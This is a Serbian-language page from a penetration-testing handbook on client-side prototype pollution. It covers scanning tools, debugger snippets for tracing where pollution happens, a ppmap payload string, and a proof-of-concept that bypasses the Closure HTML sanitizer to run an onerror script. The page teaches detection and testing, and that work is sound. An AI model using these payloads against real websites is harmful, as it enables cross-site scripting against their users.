# Klijentska Strana Zagađenja Prototipa

{{#include ../../../banners/hacktricks-training.md}}

## Otkriće korišćenjem automatskih alata

Alati [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **i** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) mogu se koristiti za **pronalazak ranjivosti na zagađenje prototipa**.

Pored toga, možete koristiti i **proširenje za pregledač** [**PPScan**](https://github.com/msrkp/PPScan) da **automatski** **skenirate** **stranice** koje **pristupate** za ranjivosti na zagađenje prototipa.

### Debagovanje gde se svojstvo koristi <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Pronalaženje uzroka zagađenja prototipa <a href="#id-5530" id="id-5530"></a>

Kada je ranjivost zagađenja prototipa identifikovana pomoću nekog od alata, i ako kod nije previše složen, možete pronaći ranjivost pretražujući ključne reči kao što su `location.hash`, `decodeURIComponent` ili `location.search` u Chrome Developer Tools. Ovaj pristup vam omogućava da precizno odredite ranjivi deo JavaScript koda.

Za veće i složenije kodne baze, jednostavna metoda za otkrivanje ranjivog koda uključuje sledeće korake:

1. Koristite alat za identifikaciju ranjivosti i dobijanje payload-a dizajniranog da postavi svojstvo u konstruktoru. Primer koji pruža ppmap može izgledati ovako: `constructor[prototype][ppmap]=reserved`.
2. Postavite breakpoint na prvu liniju JavaScript koda koja će se izvršiti na stranici. Osvežite stranicu sa payload-om, pauzirajući izvršenje na ovom breakpoint-u.
3. Dok je izvršenje JavaScript-a pauzirano, izvršite sledeći skript u JS konzoli. Ovaj skript će signalizirati kada je 'ppmap' svojstvo kreirano, pomažući u lociranju njegovog porekla:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Vratite se na karticu **Sources** i izaberite “Resume script execution”. JavaScript će nastaviti sa izvršavanjem, a 'ppmap' svojstvo će biti zagađeno kao što se očekuje. Korišćenje datog snippeta olakšava identifikaciju tačne lokacije gde je 'ppmap' svojstvo zagađeno. Istraživanjem **Call Stack**, mogu se posmatrati različiti stekovi gde je došlo do zagađenja.

Kada odlučujete koji stek da istražujete, često je korisno ciljati stekove povezane sa JavaScript bibliotečkim datotekama, jer se zagađenje prototipa često dešava unutar ovih biblioteka. Identifikujte relevantan stek ispitivanjem njegove povezanosti sa bibliotečkim datotekama (vidljivo sa desne strane, slično slici koja je data kao vodič). U scenarijima sa više stekova, kao što su oni na linijama 4 i 6, logičan izbor je stek na liniji 4, jer predstavlja početno zagađenje i tako uzrok ranjivosti. Klikom na stek bićete preusmereni na ranjivi kod.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Pronalaženje Script Gadgets

Gadget je **kod koji će biti zloupotrebljen kada se otkrije PP ranjivost**.

Ako je aplikacija jednostavna, možemo **pretraživati** za **ključnim rečima** kao što su **`srcdoc/innerHTML/iframe/createElement`** i pregledati izvorni kod i proveriti da li **dovodi do izvršavanja javascripta**. Ponekad, pomenute tehnike možda uopšte ne pronađu gadgete. U tom slučaju, čista revizija izvornog koda otkriva neke lepe gadgete kao što je donji primer.

### Primer pronalaženja PP gadgeta u kodu Mithil biblioteke

Proverite ovaj writeup: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Rekompilacija payload-a za ranjive biblioteke

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Zaobilaženje HTML sanitizera putem PP

[**Ova istraživanja**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) prikazuju PP gadgete koji se koriste za **zaobilaženje sanitizacija** koje pružaju neke biblioteke HTML sanitizera:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Reference

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
